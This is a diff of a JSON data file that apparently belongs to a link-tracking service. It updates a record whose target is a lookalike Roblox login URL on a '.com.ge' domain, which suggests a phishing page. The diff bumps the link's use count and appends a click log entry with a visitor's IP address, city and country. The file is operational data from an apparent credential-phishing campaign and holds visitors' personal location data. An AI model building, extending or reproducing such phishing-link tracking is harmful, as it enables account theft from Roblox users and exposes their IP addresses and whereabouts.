@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1424,
+    "useCount": 1425,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11558,6 +11558,14 @@
         "ip": "75.65.204.79",
         "country": "United States",
         "city": "West Monroe",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777429824335,
+        "ip": "172.56.66.55",
+        "country": "United States",
+        "city": "Atlanta",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
